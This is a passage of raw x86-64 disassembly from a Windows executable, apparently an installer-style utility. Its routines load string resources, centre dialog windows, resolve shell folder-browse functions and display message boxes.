   140004a3e:	00 
   140004a3f:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   140004a46:	5f                   	pop    %rdi
   140004a47:	5e                   	pop    %rsi
   140004a48:	5d                   	pop    %rbp
   140004a49:	c3                   	ret
   140004a4a:	cc                   	int3
   140004a4b:	cc                   	int3
   140004a4c:	cc                   	int3
   140004a4d:	cc                   	int3
   140004a4e:	cc                   	int3
   140004a4f:	cc                   	int3
   140004a50:	cc                   	int3
   140004a51:	cc                   	int3
   140004a52:	cc                   	int3
   140004a53:	cc                   	int3
   140004a54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a59:	57                   	push   %rdi
   140004a5a:	48 83 ec 30          	sub    $0x30,%rsp
   140004a5e:	45 33 c0             	xor    %r8d,%r8d
   140004a61:	48 8d 0d f0 4e 00 00 	lea    0x4ef0(%rip),%rcx        # 0x140009958
   140004a68:	33 d2                	xor    %edx,%edx
   140004a6a:	e8 89 07 00 00       	call   0x1400051f8
   140004a6f:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004a74:	8b f8                	mov    %eax,%edi
   140004a76:	8d 50 01             	lea    0x1(%rax),%edx
   140004a79:	48 c1 e2 03          	shl    $0x3,%rdx
   140004a7d:	48 ff 15 64 49 00 00 	rex.W call *0x4964(%rip)        # 0x1400093e8
   140004a84:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a89:	48 8b d8             	mov    %rax,%rbx
   140004a8c:	48 85 c0             	test   %rax,%rax
   140004a8f:	75 20                	jne    0x140004ab1
   140004a91:	21 44 24 28          	and    %eax,0x28(%rsp)
   140004a95:	45 33 c9             	xor    %r9d,%r9d
   140004a98:	45 33 c0             	xor    %r8d,%r8d
   140004a9b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004aa2:	00 
   140004aa3:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140004aa8:	33 c9                	xor    %ecx,%ecx
   140004aaa:	e8 7d 04 00 00       	call   0x140004f2c
   140004aaf:	eb 74                	jmp    0x140004b25
   140004ab1:	44 8b c7             	mov    %edi,%r8d
   140004ab4:	48 8d 0d 9d 4e 00 00 	lea    0x4e9d(%rip),%rcx        # 0x140009958
   140004abb:	48 8b d3             	mov    %rbx,%rdx
   140004abe:	e8 35 07 00 00       	call   0x1400051f8
   140004ac3:	85 c0                	test   %eax,%eax
   140004ac5:	75 16                	jne    0x140004add
   140004ac7:	21 44 24 28          	and    %eax,0x28(%rsp)
   140004acb:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140004ad0:	45 33 c0             	xor    %r8d,%r8d
   140004ad3:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004ada:	00 
   140004adb:	eb 2f                	jmp    0x140004b0c
   140004add:	48 8d 15 24 4e 00 00 	lea    0x4e24(%rip),%rdx        # 0x140009908
   140004ae4:	48 8b cb             	mov    %rbx,%rcx
   140004ae7:	48 ff 15 02 49 00 00 	rex.W call *0x4902(%rip)        # 0x1400093f0
   140004aee:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004af3:	85 c0                	test   %eax,%eax
   140004af5:	74 1f                	je     0x140004b16
   140004af7:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004afc:	4c 8b c3             	mov    %rbx,%r8
   140004aff:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140004b06:	00 
   140004b07:	ba e9 03 00 00       	mov    $0x3e9,%edx
   140004b0c:	45 33 c9             	xor    %r9d,%r9d
   140004b0f:	33 c9                	xor    %ecx,%ecx
   140004b11:	e8 16 04 00 00       	call   0x140004f2c
   140004b16:	48 8b cb             	mov    %rbx,%rcx
   140004b19:	48 ff 15 70 47 00 00 	rex.W call *0x4770(%rip)        # 0x140009290
   140004b20:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b25:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004b2a:	48 83 c4 30          	add    $0x30,%rsp
   140004b2e:	5f                   	pop    %rdi
   140004b2f:	c3                   	ret
   140004b30:	cc                   	int3
   140004b31:	cc                   	int3
   140004b32:	cc                   	int3
   140004b33:	cc                   	int3
   140004b34:	cc                   	int3
   140004b35:	cc                   	int3
   140004b36:	cc                   	int3
   140004b37:	cc                   	int3
   140004b38:	71 61                	jno    0x140004b9b
   140004b3a:	d6                   	udb
   140004b3b:	50                   	push   %rax
   140004b3c:	a1 0e 40 b6 48 83 ec 	movabs 0x8328ec8348b6400e,%eax
   140004b43:	28 83 
   140004b45:	fa                   	cli
   140004b46:	01 75 17             	add    %esi,0x17(%rbp)
   140004b49:	ba 66 04 00 00       	mov    $0x466,%edx
   140004b4e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004b54:	48 ff 15 ad 49 00 00 	rex.W call *0x49ad(%rip)        # 0x140009508
   140004b5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b60:	33 c0                	xor    %eax,%eax
   140004b62:	48 83 c4 28          	add    $0x28,%rsp
   140004b66:	c3                   	ret
   140004b67:	cc                   	int3
   140004b68:	cc                   	int3
   140004b69:	cc                   	int3
   140004b6a:	cc                   	int3
   140004b6b:	cc                   	int3
   140004b6c:	cc                   	int3
   140004b6d:	cc                   	int3
   140004b6e:	cc                   	int3
   140004b6f:	cc                   	int3
   140004b70:	48 8b c4             	mov    %rsp,%rax
   140004b73:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004b77:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004b7b:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140004b7f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140004b83:	57                   	push   %rdi
   140004b84:	41 54                	push   %r12
   140004b86:	41 55                	push   %r13
   140004b88:	41 56                	push   %r14
   140004b8a:	41 57                	push   %r15
   140004b8c:	48 83 ec 70          	sub    $0x70,%rsp
   140004b90:	4c 8b f9             	mov    %rcx,%r15
   140004b93:	48 8d 0d 16 76 00 00 	lea    0x7616(%rip),%rcx        # 0x14000c1b0
   140004b9a:	48 ff 15 97 46 00 00 	rex.W call *0x4697(%rip)        # 0x140009238
   140004ba1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ba6:	33 db                	xor    %ebx,%ebx
   140004ba8:	48 8b f0             	mov    %rax,%rsi
   140004bab:	48 85 c0             	test   %rax,%rax
   140004bae:	0f 84 cb 01 00 00    	je     0x140004d7f
   140004bb4:	48 8d 15 15 76 00 00 	lea    0x7615(%rip),%rdx        # 0x14000c1d0
   140004bbb:	48 8b c8             	mov    %rax,%rcx
   140004bbe:	48 ff 15 bb 46 00 00 	rex.W call *0x46bb(%rip)        # 0x140009280
   140004bc5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004bca:	4c 8b e0             	mov    %rax,%r12
   140004bcd:	48 85 c0             	test   %rax,%rax
   140004bd0:	0f 84 93 01 00 00    	je     0x140004d69
   140004bd6:	ba c3 00 00 00       	mov    $0xc3,%edx
   140004bdb:	48 8b ce             	mov    %rsi,%rcx
   140004bde:	48 ff 15 9b 46 00 00 	rex.W call *0x469b(%rip)        # 0x140009280
   140004be5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004bea:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   140004bf1:	00 
   140004bf2:	48 85 c0             	test   %rax,%rax
   140004bf5:	0f 84 6e 01 00 00    	je     0x140004d69
   140004bfb:	48 8d 15 e6 75 00 00 	lea    0x75e6(%rip),%rdx        # 0x14000c1e8
   140004c02:	48 8b ce             	mov    %rsi,%rcx
   140004c05:	48 ff 15 74 46 00 00 	rex.W call *0x4674(%rip)        # 0x140009280
   140004c0c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c11:	4c 8b e8             	mov    %rax,%r13
   140004c14:	48 85 c0             	test   %rax,%rax
   140004c17:	0f 84 4c 01 00 00    	je     0x140004d69
   140004c1d:	38 1d 7d 7f 00 00    	cmp    %bl,0x7f7d(%rip)        # 0x14000cba0
   140004c23:	48 8d 3d 76 7f 00 00 	lea    0x7f76(%rip),%rdi        # 0x14000cba0
   140004c2a:	bd 04 01 00 00       	mov    $0x104,%ebp
   140004c2f:	75 51                	jne    0x140004c82
   140004c31:	48 8b d7             	mov    %rdi,%rdx
   140004c34:	8b cd                	mov    %ebp,%ecx
   140004c36:	48 ff 15 0b 47 00 00 	rex.W call *0x470b(%rip)        # 0x140009348
   140004c3d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c42:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004c46:	48 ff c2             	inc    %rdx
   140004c49:	38 1c 17             	cmp    %bl,(%rdi,%rdx,1)
   140004c4c:	75 f8                	jne    0x140004c46
   140004c4e:	48 03 d7             	add    %rdi,%rdx
   140004c51:	48 8b cf             	mov    %rdi,%rcx
   140004c54:	48 ff 15 fd 48 00 00 	rex.W call *0x48fd(%rip)        # 0x140009558
   140004c5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c60:	4c 8b f0             	mov    %rax,%r14
   140004c63:	80 38 5c             	cmpb   $0x5c,(%rax)
   140004c66:	75 1a                	jne    0x140004c82
   140004c68:	48 8b d0             	mov    %rax,%rdx
   140004c6b:	48 8b cf             	mov    %rdi,%rcx
   140004c6e:	48 ff 15 e3 48 00 00 	rex.W call *0x48e3(%rip)        # 0x140009558
   140004c75:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c7a:	80 38 3a             	cmpb   $0x3a,(%rax)
   140004c7d:	74 03                	je     0x140004c82
   140004c7f:	41 88 1e             	mov    %bl,(%r14)
   140004c82:	48 8d 05 c7 7b 00 00 	lea    0x7bc7(%rip),%rax        # 0x14000c850
   140004c89:	88 1d d1 7d 00 00    	mov    %bl,0x7dd1(%rip)        # 0x14000ca60
   140004c8f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004c94:	48 8d 05 a5 fe ff ff 	lea    -0x15b(%rip),%rax        # 0x140004b40
   140004c9b:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140004ca0:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140004ca5:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140004caa:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004caf:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140004cb6:	00 
   140004cb7:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140004cbc:	49 ba 70 b2 5b 76 41 	movabs $0xf8943f41765bb270,%r10
   140004cc3:	3f 94 f8 
   140004cc6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004ccb:	49 8b c4             	mov    %r12,%rax
   140004cce:	ff 15 ac 49 00 00    	call   *0x49ac(%rip)        # 0x140009680
   140004cd4:	4c 8b f0             	mov    %rax,%r14
   140004cd7:	48 85 c0             	test   %rax,%rax
   140004cda:	74 71                	je     0x140004d4d
   140004cdc:	49 ba 70 a8 53 12 59 	movabs $0xa6d536591253a870,%r10
   140004ce3:	36 d5 a6 
   140004ce6:	48 8b c8             	mov    %rax,%rcx
   140004ce9:	48 8b d7             	mov    %rdi,%rdx
   140004cec:	49 8b c5             	mov    %r13,%rax
   140004cef:	ff 15 8b 49 00 00    	call   *0x498b(%rip)        # 0x140009680
   140004cf5:	38 1d a5 7e 00 00    	cmp    %bl,0x7ea5(%rip)        # 0x14000cba0
   140004cfb:	74 35                	je     0x140004d32
   140004cfd:	48 8d 0d 5c 7d 00 00 	lea    0x7d5c(%rip),%rcx        # 0x14000ca60
   140004d04:	48 2b f9             	sub    %rcx,%rdi
   140004d07:	48 8d 85 fa fe ff 7f 	lea    0x7ffffefa(%rbp),%rax
   140004d0e:	48 85 c0             	test   %rax,%rax
   140004d11:	74 12                	je     0x140004d25
   140004d13:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   140004d16:	84 c0                	test   %al,%al
   140004d18:	74 0b                	je     0x140004d25
   140004d1a:	88 01                	mov    %al,(%rcx)
   140004d1c:	48 ff c1             	inc    %rcx
   140004d1f:	48 83 ed 01          	sub    $0x1,%rbp
   140004d23:	75 e2                	jne    0x140004d07
   140004d25:	48 85 ed             	test   %rbp,%rbp
   140004d28:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140004d2c:	48 0f 45 c1          	cmovne %rcx,%rax
   140004d30:	88 18                	mov    %bl,(%rax)
   140004d32:	49 ba 70 90 5b 12 e7 	movabs $0xce709ee7125b9070,%r10
   140004d39:	9e 70 ce 
   140004d3c:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140004d43:	00 
   140004d44:	49 8b ce             	mov    %r14,%rcx
   140004d47:	ff 15 33 49 00 00    	call   *0x4933(%rip)        # 0x140009680
   140004d4d:	48 8b ce             	mov    %rsi,%rcx
   140004d50:	48 ff 15 49 45 00 00 	rex.W call *0x4549(%rip)        # 0x1400092a0
   140004d57:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d5c:	38 1d fe 7c 00 00    	cmp    %bl,0x7cfe(%rip)        # 0x14000ca60
   140004d62:	0f 95 c3             	setne  %bl
   140004d65:	8b c3                	mov    %ebx,%eax
   140004d67:	eb 37                	jmp    0x140004da0
   140004d69:	48 8b ce             	mov    %rsi,%rcx
   140004d6c:	48 ff 15 2d 45 00 00 	rex.W call *0x452d(%rip)        # 0x1400092a0
   140004d73:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d78:	ba c1 04 00 00       	mov    $0x4c1,%edx
   140004d7d:	eb 05                	jmp    0x140004d84
   140004d7f:	ba c2 04 00 00       	mov    $0x4c2,%edx
   140004d84:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140004d88:	45 33 c9             	xor    %r9d,%r9d
   140004d8b:	45 33 c0             	xor    %r8d,%r8d
   140004d8e:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004d95:	00 
   140004d96:	49 8b cf             	mov    %r15,%rcx
   140004d99:	e8 8e 01 00 00       	call   0x140004f2c
   140004d9e:	33 c0                	xor    %eax,%eax
   140004da0:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004da5:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004da9:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140004dad:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140004db1:	49 8b e3             	mov    %r11,%rsp
   140004db4:	41 5f                	pop    %r15
   140004db6:	41 5e                	pop    %r14
   140004db8:	41 5d                	pop    %r13
   140004dba:	41 5c                	pop    %r12
   140004dbc:	5f                   	pop    %rdi
   140004dbd:	c3                   	ret
   140004dbe:	cc                   	int3
   140004dbf:	cc                   	int3
   140004dc0:	cc                   	int3
   140004dc1:	cc                   	int3
   140004dc2:	cc                   	int3
   140004dc3:	cc                   	int3
   140004dc4:	cc                   	int3
   140004dc5:	cc                   	int3
   140004dc6:	cc                   	int3
   140004dc7:	cc                   	int3
   140004dc8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004dcd:	55                   	push   %rbp
   140004dce:	56                   	push   %rsi
   140004dcf:	57                   	push   %rdi
   140004dd0:	41 54                	push   %r12
   140004dd2:	41 55                	push   %r13
   140004dd4:	41 56                	push   %r14
   140004dd6:	41 57                	push   %r15
   140004dd8:	48 8b ec             	mov    %rsp,%rbp
   140004ddb:	48 83 ec 70          	sub    $0x70,%rsp
   140004ddf:	48 8b 05 22 72 00 00 	mov    0x7222(%rip),%rax        # 0x14000c008
   140004de6:	48 33 c4             	xor    %rsp,%rax
   140004de9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004ded:	48 8b da             	mov    %rdx,%rbx
   140004df0:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140004df4:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140004df8:	4c 8b e1             	mov    %rcx,%r12
   140004dfb:	48 ff 15 ce 46 00 00 	rex.W call *0x46ce(%rip)        # 0x1400094d0
   140004e02:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e07:	44 8b 7d f0          	mov    -0x10(%rbp),%r15d
   140004e0b:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140004e0f:	8b 75 f4             	mov    -0xc(%rbp),%esi
   140004e12:	48 8b cb             	mov    %rbx,%rcx
   140004e15:	44 2b 7d e8          	sub    -0x18(%rbp),%r15d
   140004e19:	2b 75 ec             	sub    -0x14(%rbp),%esi
   140004e1c:	48 ff 15 ad 46 00 00 	rex.W call *0x46ad(%rip)        # 0x1400094d0
   140004e23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e28:	8b 7d e0             	mov    -0x20(%rbp),%edi
   140004e2b:	49 8b cc             	mov    %r12,%rcx
   140004e2e:	44 8b 75 e4          	mov    -0x1c(%rbp),%r14d
   140004e32:	2b 7d d8             	sub    -0x28(%rbp),%edi
   140004e35:	44 2b 75 dc          	sub    -0x24(%rbp),%r14d
   140004e39:	48 ff 15 88 46 00 00 	rex.W call *0x4688(%rip)        # 0x1400094c8
   140004e40:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e45:	48 8b c8             	mov    %rax,%rcx
   140004e48:	ba 08 00 00 00       	mov    $0x8,%edx
   140004e4d:	48 8b d8             	mov    %rax,%rbx
   140004e50:	48 ff 15 a1 43 00 00 	rex.W call *0x43a1(%rip)        # 0x1400091f8
   140004e57:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e5c:	ba 0a 00 00 00       	mov    $0xa,%edx
   140004e61:	48 8b cb             	mov    %rbx,%rcx
   140004e64:	44 8b e0             	mov    %eax,%r12d
   140004e67:	48 ff 15 8a 43 00 00 	rex.W call *0x438a(%rip)        # 0x1400091f8
   140004e6e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e73:	48 8b d3             	mov    %rbx,%rdx
   140004e76:	48 8b 5d d0          	mov    -0x30(%rbp),%rbx
   140004e7a:	48 8b cb             	mov    %rbx,%rcx
   140004e7d:	44 8b e8             	mov    %eax,%r13d
   140004e80:	48 ff 15 b1 46 00 00 	rex.W call *0x46b1(%rip)        # 0x140009538
   140004e87:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e8c:	41 2b ff             	sub    %r15d,%edi
   140004e8f:	8b c7                	mov    %edi,%eax
   140004e91:	99                   	cltd
   140004e92:	2b c2                	sub    %edx,%eax
   140004e94:	d1 f8                	sar    $1,%eax
   140004e96:	44 8b c0             	mov    %eax,%r8d
   140004e99:	44 03 45 d8          	add    -0x28(%rbp),%r8d
   140004e9d:	79 05                	jns    0x140004ea4
   140004e9f:	45 33 c0             	xor    %r8d,%r8d
   140004ea2:	eb 0f                	jmp    0x140004eb3
   140004ea4:	43 8d 0c 38          	lea    (%r8,%r15,1),%ecx
   140004ea8:	41 3b cc             	cmp    %r12d,%ecx
   140004eab:	7e 06                	jle    0x140004eb3
   140004ead:	45 8b c4             	mov    %r12d,%r8d
   140004eb0:	45 2b c7             	sub    %r15d,%r8d
   140004eb3:	44 2b f6             	sub    %esi,%r14d
   140004eb6:	41 8b c6             	mov    %r14d,%eax
   140004eb9:	99                   	cltd
   140004eba:	2b c2                	sub    %edx,%eax
   140004ebc:	d1 f8                	sar    $1,%eax
   140004ebe:	44 8b c8             	mov    %eax,%r9d
   140004ec1:	44 03 4d dc          	add    -0x24(%rbp),%r9d
   140004ec5:	79 05                	jns    0x140004ecc
   140004ec7:	45 33 c9             	xor    %r9d,%r9d
   140004eca:	eb 0f                	jmp    0x140004edb
   140004ecc:	41 8d 04 31          	lea    (%r9,%rsi,1),%eax
   140004ed0:	41 3b c5             	cmp    %r13d,%eax
   140004ed3:	7e 06                	jle    0x140004edb
   140004ed5:	45 8b cd             	mov    %r13d,%r9d
   140004ed8:	44 2b ce             	sub    %esi,%r9d
   140004edb:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   140004ee2:	00 
   140004ee3:	33 d2                	xor    %edx,%edx
   140004ee5:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004eea:	48 8b cb             	mov    %rbx,%rcx
   140004eed:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140004ef2:	48 ff 15 c7 45 00 00 	rex.W call *0x45c7(%rip)        # 0x1400094c0
   140004ef9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004efe:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140004f02:	48 33 cc             	xor    %rsp,%rcx
   140004f05:	e8 e6 37 00 00       	call   0x1400086f0
   140004f0a:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140004f11:	00 
   140004f12:	48 83 c4 70          	add    $0x70,%rsp
   140004f16:	41 5f                	pop    %r15
   140004f18:	41 5e                	pop    %r14
   140004f1a:	41 5d                	pop    %r13
   140004f1c:	41 5c                	pop    %r12
   140004f1e:	5f                   	pop    %rdi
   140004f1f:	5e                   	pop    %rsi
   140004f20:	5d                   	pop    %rbp
   140004f21:	c3                   	ret
   140004f22:	cc                   	int3
   140004f23:	cc                   	int3
   140004f24:	cc                   	int3
   140004f25:	cc                   	int3
   140004f26:	cc                   	int3
   140004f27:	cc                   	int3
   140004f28:	cc                   	int3
   140004f29:	cc                   	int3
   140004f2a:	cc                   	int3
   140004f2b:	cc                   	int3
   140004f2c:	40 55                	rex push %rbp
   140004f2e:	53                   	push   %rbx
   140004f2f:	56                   	push   %rsi
   140004f30:	57                   	push   %rdi
   140004f31:	41 54                	push   %r12
   140004f33:	41 56                	push   %r14
   140004f35:	41 57                	push   %r15
   140004f37:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140004f3e:	ff 
   140004f3f:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140004f46:	48 8b 05 bb 70 00 00 	mov    0x70bb(%rip),%rax        # 0x14000c008
   140004f4d:	48 33 c4             	xor    %rsp,%rax
   140004f50:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140004f57:	f6 05 ba 7d 00 00 01 	testb  $0x1,0x7dba(%rip)        # 0x14000cd18
   140004f5e:	4d 8b f1             	mov    %r9,%r14
   140004f61:	0f 10 05 00 4a 00 00 	movups 0x4a00(%rip),%xmm0        # 0x140009968
   140004f68:	8b 05 2a 4a 00 00    	mov    0x4a2a(%rip),%eax        # 0x140009998
   140004f6e:	49 8b f0             	mov    %r8,%rsi
   140004f71:	0f 10 0d 00 4a 00 00 	movups 0x4a00(%rip),%xmm1        # 0x140009978
   140004f78:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140004f7c:	4c 8b e1             	mov    %rcx,%r12
   140004f7f:	8a 05 17 4a 00 00    	mov    0x4a17(%rip),%al        # 0x14000999c
   140004f85:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004f8a:	88 44 24 64          	mov    %al,0x64(%rsp)
   140004f8e:	0f 10 05 f3 49 00 00 	movups 0x49f3(%rip),%xmm0        # 0x140009988
   140004f95:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004f9a:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004f9f:	0f 85 24 02 00 00    	jne    0x1400051c9
   140004fa5:	48 8b 0d c4 8e 00 00 	mov    0x8ec4(%rip),%rcx        # 0x14000de70
   140004fac:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004fb1:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140004fb7:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   140004fbc:	48 ff 15 8d 45 00 00 	rex.W call *0x458d(%rip)        # 0x140009550
   140004fc3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004fc8:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   140004fcd:	75 42                	jne    0x140005011
   140004fcf:	e8 80 31 00 00       	call   0x140008154
   140004fd4:	85 c0                	test   %eax,%eax
   140004fd6:	74 0f                	je     0x140004fe7
   140004fd8:	e8 a7 30 00 00       	call   0x140008084
   140004fdd:	41 b9 10 00 19 00    	mov    $0x190010,%r9d
   140004fe3:	85 c0                	test   %eax,%eax
   140004fe5:	75 06                	jne    0x140004fed
   140004fe7:	41 b9 10 00 01 00    	mov    $0x10010,%r9d
   140004fed:	4c 8d 05 84 85 00 00 	lea    0x8584(%rip),%r8        # 0x14000d578
   140004ff4:	49 8b cc             	mov    %r12,%rcx
   140004ff7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004ffc:	48 ff 15 f5 44 00 00 	rex.W call *0x44f5(%rip)        # 0x1400094f8
   140005003:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005008:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000500c:	e9 bd 01 00 00       	jmp    0x1400051ce
   140005011:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140005015:	48 8b c3             	mov    %rbx,%rax
   140005018:	4d 85 f6             	test   %r14,%r14
   14000501b:	74 70                	je     0x14000508d
   14000501d:	48 ff c0             	inc    %rax
   140005020:	41 80 3c 06 00       	cmpb   $0x0,(%r14,%rax,1)
   140005025:	75 f6                	jne    0x14000501d
   140005027:	48 8b cb             	mov    %rbx,%rcx
   14000502a:	48 ff c1             	inc    %rcx
   14000502d:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   140005031:	75 f7                	jne    0x14000502a
   140005033:	48 03 c1             	add    %rcx,%rax
   140005036:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000503b:	48 8b cb             	mov    %rbx,%rcx
   14000503e:	48 ff c1             	inc    %rcx
   140005041:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   140005045:	75 f7                	jne    0x14000503e
   140005047:	48 83 c0 64          	add    $0x64,%rax
   14000504b:	48 03 c1             	add    %rcx,%rax
   14000504e:	b9 40 00 00 00       	mov    $0x40,%ecx
   140005053:	8b d0                	mov    %eax,%edx
   140005055:	44 8b f8             	mov    %eax,%r15d
   140005058:	48 ff 15 89 43 00 00 	rex.W call *0x4389(%rip)        # 0x1400093e8
   14000505f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005064:	48 8b f8             	mov    %rax,%rdi
   140005067:	48 85 c0             	test   %rax,%rax
   14000506a:	0f 84 95 00 00 00    	je     0x140005105
   140005070:	4c 8b ce             	mov    %rsi,%r9
   140005073:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140005078:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000507d:	41 8b d7             	mov    %r15d,%edx
   140005080:	48 8b c8             	mov    %rax,%rcx
   140005083:	e8 34 c0 ff ff       	call   0x1400010bc
   140005088:	e9 cf 00 00 00       	jmp    0x14000515c
   14000508d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005092:	48 ff c0             	inc    %rax
   140005095:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140005099:	75 f7                	jne    0x140005092
   14000509b:	48 85 f6             	test   %rsi,%rsi
   14000509e:	74 46                	je     0x1400050e6
   1400050a0:	48 8b cb             	mov    %rbx,%rcx
   1400050a3:	48 ff c1             	inc    %rcx
   1400050a6:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   1400050aa:	75 f7                	jne    0x1400050a3
   1400050ac:	48 83 c0 64          	add    $0x64,%rax
   1400050b0:	48 03 c1             	add    %rcx,%rax
   1400050b3:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400050b8:	8b d0                	mov    %eax,%edx
   1400050ba:	44 8b f0             	mov    %eax,%r14d
   1400050bd:	48 ff 15 24 43 00 00 	rex.W call *0x4324(%rip)        # 0x1400093e8
   1400050c4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050c9:	48 8b f8             	mov    %rax,%rdi
   1400050cc:	48 85 c0             	test   %rax,%rax
   1400050cf:	74 34                	je     0x140005105
   1400050d1:	4c 8b ce             	mov    %rsi,%r9
   1400050d4:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400050d9:	41 8b d6             	mov    %r14d,%edx
   1400050dc:	48 8b c8             	mov    %rax,%rcx
   1400050df:	e8 d8 bf ff ff       	call   0x1400010bc
   1400050e4:	eb 76                	jmp    0x14000515c
   1400050e6:	ff c0                	inc    %eax
   1400050e8:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400050ed:	8b d0                	mov    %eax,%edx
   1400050ef:	8b f0                	mov    %eax,%esi
   1400050f1:	48 ff 15 f0 42 00 00 	rex.W call *0x42f0(%rip)        # 0x1400093e8
   1400050f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050fd:	48 8b f8             	mov    %rax,%rdi
   140005100:	48 85 c0             	test   %rax,%rax
   140005103:	75 07                	jne    0x14000510c
   140005105:	8b c3                	mov    %ebx,%eax
   140005107:	e9 c2 00 00 00       	jmp    0x1400051ce
   14000510c:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   140005110:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
   140005115:	48 3b c2             	cmp    %rdx,%rax
   140005118:	77 3a                	ja     0x140005154
   14000511a:	48 2b d6             	sub    %rsi,%rdx
   14000511d:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005122:	4c 2b c7             	sub    %rdi,%r8
   140005125:	48 8b cf             	mov    %rdi,%rcx
   140005128:	48 8d 04 32          	lea    (%rdx,%rsi,1),%rax
